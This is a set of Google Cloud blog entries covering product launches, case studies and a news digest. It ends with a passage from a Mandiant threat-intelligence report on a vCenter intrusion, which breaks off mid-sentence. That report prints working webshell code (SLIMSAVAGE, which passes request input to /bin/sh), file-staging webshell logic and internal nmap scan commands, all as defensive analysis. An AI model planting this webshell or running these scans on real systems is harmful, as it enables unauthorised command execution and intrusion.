entries.content:
Omid Ashtari

Founder & CEO, Kult

Welcome to The Blueprint, our ongoing series where we highlight how Google Cloud customers are tackling unique and common challenges across industries using the latest AI and cloud technologies. We hope to inspire others looking to innovate in their work.

Kult is a London-based startup building a companion experience for games. It sits alongside your session, understands the game you are playing and where you are in it, and answers by voice and on a second screen. The more you play with it, the better it knows how you like to play.

The challenge

Traditionally, getting help in the middle of a game meant alt-tabbing, opening a video, scrolling a forum, and hoping you find the answer before you forget why you looked. Information should come to the player instead. As gamers ourselves, our team wanted a way for someone to be able to ask a question out loud, hands on the keyboard or controller, hear an answer, and consult a second screen if needed, without interrupting their immersion in the game.

Three things decide whether that works: latency, accuracy and cost.

  • Latency: Games are time-sensitive. The answer has to be fast, and the interaction should feel like asking a friend who’s an expert on the game, sitting on the couch next to you and watching you play.

  • Accuracy: General-purpose models have training cutoffs. They can be months out of date and are often wrong about a specific game, patch, or build — and a wrong answer can be costly in the game and a waste of the player's time. Every game also has its own items, systems, and vocabulary, so accuracy has to hold across hundreds of games. The right answer also depends on the player: The same question deserves a different answer 10 minutes into a game than a 100 hours in.

  • Cost: An always-on companion handles many turns per session, so every turn has to be inexpensive enough for a consumer product. Covering hundreds of games is only possible if adding one is cheap and takes no manual work.

The solution

Given these needs, we knew we would want a range of models to build Kult. Fortunately, Google’s Gemini models have some of the greatest variety in terms of balancing performance and especially cost, and with the Model Garden in Gemini platform, we have access to hundreds of models beyond Gemini. Gemini models have became the default family on both sides of the system: the live conversation, and the knowledge behind it, dynamically match the right model for every task.

The lightest Gemini Flash tier handles high-volume, repetitive work, where we make thousands of small calls for every game we add. Gemini Flash runs every conversational turn. It works out what the player is asking and writes an answer grounded in our knowledge of that game, fast enough to keep up with play. The latest and most advanced Gemini models handle the rare, heavy reasoning we do once per game.

Having that range on one API surface matters to a small team. The latest Gemini Flash models in particular sit at a point of price, speed, and quality that we have not found elsewhere, and they are the reason an always-on gaming companion works as a consumer product.

We reach the models through both the Gemini platform and the Gemini Developer API, with a routing layer that picks the backend for each model. Our backend runs on Google Kubernetes Engine.

Every answer comes in two parts. The voice gives the short version. At the same moment, a visual answer lands in a feed on the player's second screen: images, embedded video, maps, builds, interactive tools made for that game, and links to the guides and creators behind the answer.

We build that feed with Google's open standard for agent-generated interfaces. The model does not write code. It describes the interface it wants using a catalog of components we designed, and the app renders it natively in Kult's own style. That keeps the feed safe and consistent, and lets us add new kinds of visual answers, and new devices, without rebuilding the front end.

The architecture

The outcome

Kult now covers more than 100 games, and adding a game is an automated process, not a manual project. That’s a key part of what lets a small team aim at any game a player picks up, including new releases, where most of the playing happens in the first weeks.

We are in alpha with our first players and opening up to more over the coming months. As we have grown, we have built a close working relationship with the Google Cloud team, with direct access to their engineers when we need it. That matters when every model generation raises the ceiling of what a gaming companion product can do.

This expertise, both within the models and our supportive partners, allows us to focus on our passion: building the features gamers want, faster and better than any possible competition.

The details

Five principles shape how Kult works.

Answers come from knowledge we build, not from what a model happens to remember. A game can change with every patch. For each game we cover, Kult builds a structured knowledge base automatically and keeps it current, and the model's job is to reason over that knowledge.

The answer depends on who is asking. Kult keeps track of your session: the game, what you have been doing, and what you asked a moment ago. "What is he weak to?" needs no further explanation, because Kult already knows which boss you’re facing. Over time it learns from how you play, what you ask about and what you ignore, and shapes its answers around you. A player who wants the fastest route and one who wants to find everything should not get the same replies.

The player is never left in silence. Kult responds straight away and carries the conversation while the deeper reasoning runs behind it. The spoken answer is short, and the visual feed carries everything the voice cannot.

The smallest model that can do the job does the job. Much of the work in a system like ours is a decision, not a piece of writing. It needs to understand which game the query is about, does the question need a lookup, did the answer cover the point.

For decisions like these we use Jev, a decision-only model that returns a choice with a calibrated confidence score. Confident cases are settled in a fraction of a second at a fraction of the cost, and uncertain ones escalate to a larger Gemini model. Every model sits behind a registry, so when a new generation ships, we benchmark it against reference answers written by people who know the games, and swap it in if it wins.

Every question makes Kult better. Taken together, the questions players ask about a game show us where its knowledge is thin and what to build next. We are designing Kult so that this loop tightens with every session. The more people play, the richer the knowledge becomes for everyone. Every session teaches a player something, as well as the entire Kult system, and Kult helps them keep it. We think the companion that sits beside the game is only the start.

Next is computer vision. In the coming months, Kult will start to see what is happening in your game, so the companion can be aware of the moment without being asked. We’re using Google's Live models as part of that work, for video understanding and more.

If you are a gamer, try it for yourself www.joinkult.gg

entries.content:
Himanshu Kohli

Product Manager

Manjul Sahay

Product Manager

The vast majority of enterprise information is unstructured, locked away in object storage as petabytes of images, PDFs, videos, and audio files. This data holds the institutional knowledge AI agents need to do business-critical work. But to an agent, a raw object is just bytes it can't reason over. As enterprises start to deploy agents in production, the focus has shifted toward transforming these raw objects into rich, agent-ready context.

Today, we are introducing object enrichments, a new Google Cloud Storage capability that uses AI models to automatically extract rich contextual metadata from Cloud Storage objects and saves it in-place as object context, enabling agents to acquire the information needed to make complex business decisions. Object enrichments gives customers access to the AI models used by internal Google services such as Google Photos, offering image annotations like object detection and image labeling at 75% cost savings when compared to similar services from other cloud providers. Available in preview, this fully managed service also includes high-quality PDF classification model, enabling customers to seamlessly turn their object store into an intelligent, AI-ready foundation.

“L'Oreal is the 4th largest advertiser in the world, and managing media assets at that scale is complex. Cloud Storage object enrichments’s high quality and cost-effective annotations enable us to discover, understand, and govern our content at scale, accelerating marketing and advertising operations while remaining compliant in all markets. Object enrichments enables L'Oreal to label its extensive creative asset repository 100x faster at a fraction of the cost of existing pipelines and processes.” – Antoine Castex, Principal Data & AI Architect, L’Oreal

Agents need context, not raw bytes

To operate efficiently, agents need grounded knowledge; however, reading every raw file at scale is cost- and performance-prohibitive. For example, if an operations agent needs to pinpoint a specific event—such as a doorstep package delivery or a roadway hazard—streaming thousands of smart-camera or vehicle frames into the AI model on every user prompt would burn through expensive tokens and add minutes of delay. To bridge this gap, teams must pre-process raw data and extract rich, contextual metadata, which agents can then leverage at runtime. Historically, achieving this meant dealing with three challenges:

  • Cost: Running models over millions to billions of objects is expensive, pushing organizations to compromise and process only a fraction of their data, creating blind spots that lessen agents’ accuracy.

  • Operational toil: A self-managed pipeline means stitching together multiple services — from event triggers and queues to custom infrastructure built on Cloud Run or Google Kubernetes Engine (GKE) — along with scalable retry/error logic and job scheduling. Once deployed, that infrastructure still requires continuous upgrades and capacity management. Teams sometimes spend months on this plumbing rather than focusing on building agents that solve actual business problems.

  • Fragmented metadata: Extracted metadata often lands in a separate data store, decoupling context from the bytes it describes. Teams must pay for and maintain a second storage system, govern access policies across disconnected permission models, and run custom cleanup jobs to keep metadata in sync when source objects are copied, moved, or deleted.

This is why we built object enrichments: to natively provide agent-ready context for your unstructured data, equipping your agents with complete, grounded knowledge without prohibitive costs, custom pipeline plumbing, or fragmented metadata.

Key benefits of object enrichments

1. Reduce costs with Google models

Object enrichments offers dramatic savings at scale: enriching 10 million images or PDFs costs just $700 (according to published pricing). You can use Google’s high-quality AI models for image annotations—including object detection, face detection, image labeling, and explicit content detection—at one of the industry’s best price points. In addition, the PDF classification model lets you categorize documents into standard business and industry categories like Finance, Games, News, and Health.

"Even with a highly accurate baseline, Hyperscience leveraged object enrichments to drive a 50%+ lift in document classification accuracy, while simultaneously reducing classification inference costs by 2-3x.” – Mayur Pillay, VP Partnerships, Hyperscience

2. Generate richer context with Gemini

For complex multimodal reasoning across text, PDFs, images, audio, and video, you can leverage Gemini natively with object enrichments, unlocking advanced use cases such as summarization, entity extraction, transcription, and translation. Please reach out to us at storage-ai@google.com to learn more and request access to this upcoming functionality.

3. No pipeline, low toil setup

Skip the brittle, multi-component DIY pipelines. Setting up an enrichment job just takes three simple steps, with no code required in the Google Cloud console, or programmatically via the Cloud Storage API, following these steps:

  • Define your scope: Provide a set of buckets containing the objects to process and specify the processing location. Object enrichments can scale to millions or billions of objects.

  • Choose your models: Pick one or more of the five first-party Cloud Storage models for images and PDFs.

  • Grant permissions: Grant the necessary IAM permissions to the object enrichments service to access your Cloud Storage buckets.

Object enrichments handles the rest: It orchestrates model inference, parses the responses, and writes the results to each object's object context, with built-in retries and throttling. There are no queues to manage, workers to scale, or glue code to maintain.

"Cloud Storage object enrichments and BigQuery, slashes AI development from 6 months to 1 month while rapidly improving our models." - Brandon Bunker, VP of Product AI, Vivint

4. Context lives where the bytes live

Instead of parking metadata in a separate data store, object enrichments writes model outputs directly to object context, a specialized Cloud Storage metadata construct that’s purpose-built for storing contextual information as structured key-value pairs alongside the object itself. Because context is stored alongside object’s actual bytes, you get enterprise-grade data management out of the box, with:

  • Cloud Storage durability and simplified lifecycle management: Object context shares the same durability and consistency properties as the underlying Cloud Storage object. It travels automatically with the object during copy, move, and replication operations and is automatically removed when the object is deleted — no more cleanup jobs!

  • Fine-grained IAM governance: Using IAM, administrators can control who can read, add, update, or remove object context.

  • Fast object filtering and serving: Applications can filter object listings directly by object context key-value pairs or read context metadata alongside objects, in order to serve richer experiences.

  • Turnkey multimodal analytics in BigQuery: You can easily configure your object context to natively flow into BigQuery via Storage Insights datasets, allowing data teams to run SQL analytics, build dashboards, and join unstructured file insights with structured enterprise tables, without writing a single line of ETL code.

What customers are building

Early customers are already putting object enrichments to work across key business scenarios:

  • Creative asset search and media archives: Marketing, retail, and media organizations manage petabytes of creative image assets, where finding a specific asset, e.g., "a red car driving at sunset" or "a vintage convertible in the desert during golden hour", requires rich semantic metadata. Object enrichments automatically generates descriptive labels in object context, which can then be indexed into a vector database or BigQuery to power accurate retrieval-augmented generation (RAG) applications and asset-discovery agents.

  • Automated trust, safety, and content moderation: Social platforms, marketplaces, and digital media pipelines scan millions of user uploads and supplier catalogs every day for explicit content. Historically, scaling this for every single upload has been cost-prohibitive, but not anymore. With object enrichments, you can process 10 million images for just $700.

  • Training data curation for frontier AI: Autonomous driving, smart home, and robotics companies capture hundreds of millions of raw camera and sensor files. They often need targeted data samples for specific fine-tuning scenarios, which make up only a tiny fraction of their corpus. By enriching raw captures in place with object detection and image labeling models and then querying the resulting metadata in BigQuery, ML engineers can pinpoint exact training cohorts in minutes rather than months.

  • Multimodal analytics: Combine insights from images and documents with structured business data to drive personalization, fraud detection, and trend discovery — for example, analyzing customer uploaded images of the product alongside their comments and recent sales data.

Get started with object enrichments

Object enrichments is available in preview today in the Cloud Storage console and through the Cloud Storage API. To get started, check out the following resources

  • Read the documentation: Learn how to configure an enrichments job and use object contexts.

  • Analyze in BigQuery: Set up Storage Insights datasets and query your enrichments alongside your BigQuery business data.

  • Connect your agents: Pair object enrichments and object context with the Cloud Storage MCP server to give agents secure, IAM-scoped access to your data and its context.

  • Review pricing: See Cloud Storage pricing for details.

  • Gemini enrichments: Reach out to us at storage-ai@google.com to learn more and request access to this upcoming functionality.

  • Start building: Head to the Cloud Storage console to enrich your first bucket in just three clicks.

entries.content:
Aimee Catalano

Managing Director, Global Partner Marketing

At Google Cloud, our commitment to agentic transformation extends to everyone, including the partners who build and grow alongside us.

Today, we are excited to introduce new Gemini-powered co-marketing capabilities directly within everyday go-to-market workflows for our partners. These new features enable partners to produce customized, brand-aligned joint assets in minutes, scaling campaign execution and driving pipeline more effectively.

From marketing together to innovating together: Scaling impact with Gemini

As technology evolves and customer expectations shift, marketers are no longer just producing campaigns. We’re building continuous, hyper-personalized, data-driven demand engines, and we’re doing it across an increasingly fragmented buyer journey.

For our partner network, delivering on this expectation means solving a dual challenge: differentiating core offerings while articulating a unified vision with Google Cloud.

Bridging that gap at enterprise scale requires more than incremental efficiency — it requires agentic agility to jointly create, adapt, and distribute stories together that resonate.

What’s new: Advanced agentic capabilities within Partner Marketing Studio

The updated Partner Marketing Studio introduces a suite of agentic tools designed to accelerate campaign execution, optimize performance, and maximize impact for partners of all sizes.

  • Agentic search: Partners can now use a simple chat feature. Search for what you need, rather than navigating a content repository.

  • Brand alignment: Never worry about brand compliance again, with a brand reviewer agent that helps ensure your content upholds Google Cloud’s partner brand guidelines.

  • ISV asset creation: Gemini generated, high-fidelity marketing assets to drive demand to marketplace listings.

  • Social automation: A new social editor with the ability to create posts across multiple networks simultaneously, add account tags, and refine messaging per channel with AI.

  • Customer case studies: An agent designed to build best-in-class customer success stories to highlight joint customer wins.

  • Gemini-Assisted Translation: Accelerate global marketing programs with agentic translations across 130 languages.

  • Natural language analytics: Gain end-to-end visibility connecting marketing execution directly to tangible business outcomes.

"Partner Marketing Studio has become an extension of our partner marketing team. With built-in Gemini capabilities and ready-to-run joint campaigns, we can tailor high-impact marketing assets across industries, regions, and personas in minutes. It allows us to do more with less while accelerating pipeline for our joint solutions" - Liana Shuma, Global Head of Technology Partnerships, Pigment

Preserving the best of Partner Marketing Studio

While the platform features powerful new tools, our core focus remains unchanged: helping you build your brand authority and generate pipeline demand.

You will continue to find a curated content library structured specifically for you, highlighting top-performing campaigns aligned with Google Cloud strategic priority plays. Partners maintain full access to Google-produced localized campaign content and ready-made assets that can be customized to suit specific go-to-market objectives.

Furthermore, high-value partner services remain readily accessible within the platform:

  • Applying to host customer events directly inside a Google office.

  • Requesting a Google Cloud speaker for your hosted events.

  • Attending dedicated office-hours sessions with Google Cloud marketing experts.

  • Requesting social amplification for campaigns.

“Google offices are not only a great draw for attendees, but by handling all event logistics, Google Cloud saved us significant time, money, and allowed us to focus entirely on delivering high-impact content and driving audience engagement” - Jenny Bejarano. GTM Specialist, Tiger Analytics

“We appreciate Google Cloud’s support with speakers for our events. This collaboration strengthens our credibility and value proposition with prospects” - Tommaso Vaccarella, Co-Founder & General Manager, Connected Stories

Get started today

The new Partner Marketing Studio portal is available to all Google Cloud partners. You can log in using your existing business credentials through either of the following paths:

  • Via Google Cloud Partner Network: Navigate to Resources > Marketing > Partner Marketing Studio.

  • Via direct browser link: Visit www.partnermarketingstudio.com directly.

Our commitment: Scaling your success with Gemini

These updates are part of Google Cloud’s larger commitment to transforming how we empower and enable partners with Gemini. In addition to Partner Marketing Studio, we’re leveraging Gemini throughout the partner experience, including a revamped partner marketing funds experience to streamline activity planning, simplify pipeline reporting, and proactively validate required documentation before submission.

We’ve seen Google Cloud experience tremendous growth in recent years, and a major part of that success has been the incredible work done by our partner ecosystem. Now, as we’re bringing the power of Gemini directly into your go-to-market workflows, we’re excited to take our work together to a whole new level.

With AI at our side, and as one of our strongest offerings, it will be easier than ever to create, connect, and grow together.

entries.content:
Shrikant Kelkar

Product Manager

Mark St. John

Software Engineer

GKE Dataplane V2 is Google Cloud’s next-generation networking dataplane for Google Kubernetes Engine (GKE), built on extended Berkeley Packet Filter (eBPF) and open-source Cilium to replace traditional iptables routing and kube-proxy. We built GKE Dataplane V2 to meet the performance, scalability, and security demands of modern cloud-native workloads.

GKE customers consistently tell us that while they want to adopt GKE Dataplane V2 for its performance and scale, migrating production clusters carrying stateful workloads and established IP allocations has been challenging, often requiring a disruptive parallel cluster setup. Today, we are pleased to introduce the preview of in-place migration, allowing you to transition eligible VPC-native clusters from GKE Dataplane V1 to GKE Dataplane V2 directly.

Let’s take a look at what GKE Dataplane V2 brings to the table and how to start migrating your environment to it.

Why GKE Dataplane V2?

GKE Dataplane V2 is built on the extended Berkeley Packet Filter (eBPF) and open-source Cilium, with features specifically tuned for performance, scalability, and deep integration with Google Cloud networking. Consider the following capabilities:

  • Scale and performance: By handling packet processing with eBPF maps in the Linux kernel instead of linear 

    iptables
    rules, GKE Dataplane V2 supports clusters of up to 15,000 nodes with network policy enforcement (and up to 65,000 nodes when network policy enforcement is disabled, which requires recreating clusters). This architecture also handles the high Pod churn, fast sandbox provisioning, and network identity scaling required by large agentic AI workloads.

  • High-throughput accelerator networking: Serves as the foundational networking layer for GPU and Cloud TPU clusters on GKE, helping keep accelerators computing rather than waiting on network initialization. It also powers capabilities like GKE managed DRANET for Dynamic Resource Allocation (DRA) of network devices.

  • Network security and observability: With GKE Dataplane V2, standard Kubernetes 

    NetworkPolicy
    enforcement and hierarchical ClusterNetworkPolicy work directly in the kernel with optimized performance. GKE Dataplane V2 also provides the underlying dataplane for sidecarless GKE ambient networking, while GKE Dataplane V2 observability delivers native network policy logging, live traffic topology, and Hubble flow metrics.

The in-place migration workflow

Instead of having to manually move workloads to a new cluster, GKE now automates the transition across three stages, as described in the GKE Dataplane V2 migration guide:

1. Eligibility and preflight checks: Before starting, verify that your Pod IP ranges have enough capacity to recreate the nodes by using GKE IP address utilization insights, and check Active Assist for incompatible configurations like custom eBPF programs on managed interfaces.

2. Initiate the migration: Once you’ve verified the preflight checks, start the migration with a single Google Cloud CLI update command.

To initiate the migration on an eligible cluster, run:

3. Automated rollout and finalization: GKE updates your node pools to GKE Dataplane V2 while respecting your configured maintenance windows, exclusions, and upgrade strategies. To move faster, you can also patch specific node pools manually, or roll back to GKE Dataplane V1 at any time prior to finalization.

In-place migration supports VPC-native clusters running GKE 1.35 or later (see the migration guide for exact version requirements). It does not support routes-based clusters or clusters running Calico.

Get started

In-place migration to GKE Dataplane V2 is available now in preview. During this time, we recommend testing migrations on non-production or test clusters first as you plan your broader transition.

To learn more about GKE Dataplane V2 and to get started:

  • Review cluster eligibility and migration phases in About migrating to GKE Dataplane V2.

  • Follow the instructions in Migrate VPC-native clusters to GKE Dataplane V2.

  • Read GKE Network Interface, from kubenet to eBPF/Cilium to DRANET for background on the evolution of GKE CNIs.

  • Explore GKE networking dataplane for large agentic AI workloads to see how Dataplane V2 scales for large AI clusters.

Google Cloud Content & Editorial

Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more.

Tip: Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources.

Nov 16 - Nov 20

  • Why your AI agent keeps forgetting: a 15 minute build on agent memory

    Agents that resend the full conversation get slower and more expensive, and agents that keep nothing forget users between sessions. In the latest AI Agent Clinic episode, Google Cloud engineer Laxmi Harikumar and developer Miles Libbey add long term memory to a voice agent built with Agent Development Kit (ADK). They compare 4 memory options (flat prompting, RAG, knowledge graphs and Memory Bank in Gemini platform) and show 3 ways to keep context small.Watch the episode and get the code.
  • Cut background agent costs in half with the deferred tier on Gemini platform

    The deferred service tier is generally available (GA) on the Gemini platform for theInteractions API, Agent Development Kit (ADK), and Deep Research. Running multi-hour background loops through synchronous real-time inference introduces unnecessary cost and triggers 429 resource exhaustion errors at peak. Static batch inference offers a 50% discount only when all prompts sit in a fixed input file upfront, which breaks dynamic tool loops. On the Gemini platform, the new deferred service tier brings batch economics to dynamic, stateful, multi-turn agents. Instead of competing with live chat traffic, the scheduler routes latency-tolerant agent turns to spare global capacity at half the cost.

    Set service_tier="deferred" in ADK RunConfig or client.interactions.create() across gemini-4-argon, gemini-4-carbon, gemini-3.x models, and gemini-deep-research-1.0. Read the guides for theInteractions API, ADK, and Deep Research.

    • 50% discount and cache savings: Completed turns receive 50% off Standard PayGo rates and stack with prompt caching. Cancelled, expired, or failed turns incur no charges.
    • Managed queuing and state: During peak traffic, the platform queues and retries turns server-side with zero 429 errors. Pass previous_interaction_id to chain turns and retain warm prompt caches.

Nov 9 - Nov 13

  • More frontier model choice on Google Cloud: Anthropic’s Claude Fable 5.2 and Meta’s Muse model series.

Developers now have even more flexibility to build, deploy, and scale with the right model for every workload on Google Cloud. Anthropic’s Claude Fable 5.2 is now generally available in the Model Garden, bringing frontier intelligence to complex coding, scientific research, and multi-agent orchestration. Plus, Meta’s newest models—Muse Spark 1.3, Muse Wonder, and the efficient Muse Ember—are now available in public preview, giving teams seamless access to both proprietary and open-weight capabilities with enterprise-grade security.

Explore the models in the model garden today.

  • Next-Generation SecOps: SentinelOne and Google Cloud

    Google Cloud and SentinelOne joined forces to solve the threat scaling challenge with a fundamentally re-architected integration. As a Google Unified Security (GUS) Recommended endpoint detection and response (EDR) partner, SentinelOne pairs Google Security Operations through an optimized direct integration and streamlined data schemas, delivering essential endpoint telemetry visibility to SecOps detection and agentic SOC pipelines while significantly reducing the total cost of ownership of the integration.

    Read more
  • Layered LLM guardrails on Apigee: Static rules, Model Armor, and NeMo Guardrails 

    No single LLM guardrail catches every threat. A new technical guide and demo showcase how to use Apigee as an AI gateway to stack three complementary layers—deterministic static rules, semantic Google Cloud Model Armor filters, and flexible business logic via NVIDIA NeMo Guardrails. Together, they successfully intercepted 100% of benchmarked OWASP-mapped attacks without blocking safe prompts, running cheapest first to optimize performance and reduce token costs.

    Read the full guide
  • Scale Gemma 3 reinforcement learning on GKE with NVIDIA NeMo RL, Custom ComputeClasses, and 8-NIC RDMA

    Learn how to run distributed Group Relative Policy Optimization (GRPO) post-training for Gemma 3 on Google Kubernetes Engine (GKE). This end-to-end blueprint pairs GKE Custom ComputeClasses (with DWS Flex-Start and Spot fallback) and 8-NIC RoCE RDMA networking with NVIDIA NeMo RL and vLLM V1 to improve Gemma 3 mathematical reasoning accuracy.

    Read the technical guide
  • Securely connect internal Cloud Run MCP servers to Gemini Enterprise

    Learn how to connect Gemini Enterprise privately to internal StreamableHTTP Model Context Protocol (MCP) servers on Cloud Run using Egress Agent Gateway, Private Service Connect (PSC), FQDN-scoped Private Cloud DNS for Shared VPCs, and dual-header OAuth 2.0 + IAM authentication. Read thetechnical guide on Google Developer Forums and explore the reference implementation on GitHub.
  • Building an adaptive AI gateway with Apigee for stateful multi-agent workloads

    Multi-agent workloads often suffer from compounding context bloat, retry loops, and cross-agent state bleed.. Learn how to use Apigee as a model-agnostic, stateful multi-agent control plane for Google ADK and Gemini Enterprise Agent Platform workloads. By enforcing turn-0 pre-warmed caching, in-flight trace compaction, tool loop recovery, and dynamic model tiering between Gemini Flash and Frontier models, teams can achieve up to 80% net FinOps cost savings.

    Read the full article to explore reference architectures and benchmark data.
  • Anthropic’s exponential growth on Pub/Sub

    Discover how Anthropic, creators of the Claude AI models, uses Google Cloud Pub/Sub to power their cross-cloud telemetry and billing ingestion pipeline. Facing highly variable traffic and strict security mandates, Anthropic needed a secure, serverless messaging queue with zero manual partition management. By leveraging Pub/Sub with Private Service Connect, they built a highly efficient, zero-ETL architecture capable of seamlessly handling over 1 million events per second and 500 billion daily rows. Go behind the scenes in thiscase study to learn how Anthropic reduced consumer latency by 88% and achieved sub-second end-to-end event delivery.
  • On-demand webinar: Architecting AI workloads with Pub/Sub

    Data engineering in the AI era demands fundamentally different infrastructure. Whether you're training a custom foundation model or deploying autonomous agents, you need a messaging backbone that handles bursty traffic with enterprise security and zero operational overhead. Dive into Pub/Sub’s capabilities for the AI era, reference architectures & best practices for emerging AI applications, and how Anthropic powers their telemetry pipelines with Pub/Sub inthis free on-demand webinar.

Nov 2 - Nov 6

  • Security for AI workloads with Model Armor

    Securing generative AI applications requires robust runtime protection against prompt injection and malicious inputs. Join Nicola Cardace on Thursday, November 19, 2026, at 5:00 PM CET for a Community TechTalk exploring how to safeguard enterprise AI workloads using Model Armor. Discover practical patterns for implementing active model defense across your LLM endpoints.

entries.content:
Brad Hoffman

Director, State, Local, Higher Ed Central, Google Public Sector

As state and local agencies modernize to meet evolving public needs, leaders have an unprecedented opportunity to empower and elevate their teams. Modernizing public sector operations starts with giving dedicated public servants the right tools to thrive. By replacing repetitive administrative routines with intuitive, intelligent workflows, agencies can free their staff to do what they do best: focus on high-impact problem-solving, build rewarding careers, and deliver responsive, compassionate services to the residents and communities they serve.

Modernizing an agency workforce means transitioning employees from institutional systems to agentic platforms—redirecting their efforts away from manual administration and freeing up time for high-touch service delivery. By leveraging Google Cloud’s integrated stack to modernize daily operations, agency leaders can reliably meet regulatory requirements while creating the operational capacity to innovate, develop staff, and strengthen public trust.

Empowering municipal teams: The City of Los Angeles

Under the leadership of CIO Ted Ross, the City of Los Angeles addressed administrative constraints by deploying Google Workspace with Gemini across its entire 27,500-person municipal workforce. City employees now use agents to instantly synthesize large amounts of grant documents buried in silos and quickly rewrite public web copy for clearer readability. This digital companion allows city staff to step away from time-consuming administrative tasks and spend more time focusing on critical community service delivery, ensuring the city is operationally ready to host major global events like the 2028 Olympics and 2028 Paralympics.

Retaining regional talent: The University of Hawaii

The University of Hawaii needed a better way to keep local talent from leaving the islands. To build and retain regional talent, the university turned to BigQuery and Gemini—creating an automated, skills-first platform that helps match individuals with career opportunities. This solution maps student and faculty capabilities, matches individuals to academic roles and public research projects, and helps retain top talent.

Overcoming timeline constraints: The Indiana Department of Transportation

entries.content:
Google Threat Intelligence Group
Mandiant

Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram

Introduction

On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05. We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. 

On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as 

administrator@vsphere.local
. Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service (
vmdird
) RPC interface 
vmdirdbcp
. We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. 

ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account.

ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat.

Threat Detail

Moving laterally from the Remote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft.

Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events

Move Laterally

Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as 

/sdk
and 
/ui
. The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW.
/usr/sbin/nmap -sS -p 443,2012,389 --open .0/24
/usr/sbin/nmap -sS -p 443,2012,5480 --open .0/24
/usr/sbin/nmap -sS -p 443,9080 --open .0/24
/usr/sbin/nmap -sS -p 9080,2012 --open .0/24
/usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open .0/24

Figure 2: ARMORY CASTLE nmap port scanning

ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion.

Establish a Foothold

To establish a foothold on the first Linux appliance, the actor dropped a webshell 

ActiveSer.jsp
, tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret 
pwd=123
.
if("123".equals(request.getParameter("pwd"))){
  try{
    ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i"));
    Process p = pb.start();
    InputStream a = p.getInputStream(), b = p.getErrorStream();
    int c; byte[] d = new byte[2048];
    out.print("
");
    while((c=a.read(d))!=-1){out.print(new String(d,0,c));}
    while((c=b.read(d))!=-1){out.print(new String(d,0,c));}
    out.print("
");
    out.print("\nEXIT:"+p.waitFor());
  }catch(Exception e){out.print("ERR:"+e);}
}

Figure 3: SLIMSAVAGE Webshell

By leveraging 

ProcessBuilder("/bin/sh", "-c", ...)
, the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output (
getInputStream()
) and standard error (
getErrorStream()
), ensuring full diagnostic visibility. It also calls 
Process.waitFor()
and appends the final process return code (
\nEXIT:
).

Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, 

u.jsp
, tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a 
multipart/form-data
request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename.
File f = new File("/tmp");
f.mkdirs();
File fout = new File(f, fname);
try(FileOutputStream fos = new FileOutputStream(fout)){
    fos.write(fd);
}
m = fout.getAbsolutePath();

Figure 4: CAGEMATCH File Staging Logic

CAGEMATCH creates the 

/tmp
directory if necessary, saves the uploaded payload directly to 
/tmp/
